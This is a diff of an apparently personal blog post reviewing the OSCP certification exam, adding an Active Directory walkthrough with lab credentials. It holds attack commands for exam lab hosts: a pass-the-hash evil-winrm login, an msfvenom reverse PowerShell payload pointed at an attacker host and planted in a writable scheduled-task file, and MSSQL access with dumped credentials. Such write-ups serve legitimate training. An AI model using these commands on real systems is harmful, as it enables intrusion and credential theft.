@@ -5,6 +5,7 @@ title = 'OSCP 시험 후기'
 +++
 
 # 결과 
+
 우선 결과는 60점.
 
 윈도우 머신 전부 풀었다.
@@ -15,7 +16,7 @@ AD공략은 생각보다 쉬웠는데 stand alone은 초기 진입 실패하면 
 
 어느정도 운도 필요한 듯.
 
-# Active Directory
+# Active Directory (Set1 Done)
 
 ## WS26 .206
 
@@ -230,3 +231,58 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 `evil-winrm -i 172.16.122.200 -u administrator -H f1932cc134540745795a0c48f58cfc49`
 
 이걸로 도메인 어드민의 플래그까지 획득.
+
+# Active Directory (Set2)
+
+## 192.168.123.206 - WS26
+
+Initial credential (r.andrews:BusyOfficeWorker890)
+
+- RDP access
+
+`xfreerdp3 /v:192.168.123.206 /u:r.andrews /p:'BusyOfficeWorker890'` 
+
+In the Tasks folder, there is a schedule task.
+
+![taskschedule](/images/etc/task_schedule.png)
+
+And the file name.
+
+![taskschedule2](/images/etc/task_schedule2.png)
+
+There is write permission on this file.
+
+![writepermission](/images/etc/writepermission.png)
+
+Make a rev shell and wait for the connection.
+
+`msfvenom -p cmd/windows/reverse_powershell lhost=192.168.49.123 lport=443 > task.bat`
+
+After getting admin access, found the note.
+
+```
+C:\Users\Administrator\Documents\Simple Sticky Notes>type notes.db
+
+- Temp creds for SQL testing
+
+svc_sql : SQLPoworiouse333
+```
+
+The note mentions xp_cmdshell is available.
+
+## 172.16.123.202 - SRV22
+
+Access with the mssql credential.
+
+`impacket-mssqlclient svc_sql:'SQLPowerHouse333'@172.16.123.202 -windows-auth`
+
+it needs port fowarding. At that time I failed at this point. (But now I can!)
+
+# Standalone machines
+
+## 112
+
+ftp anonymous login -> found password list from the pdf file.
+
+
+
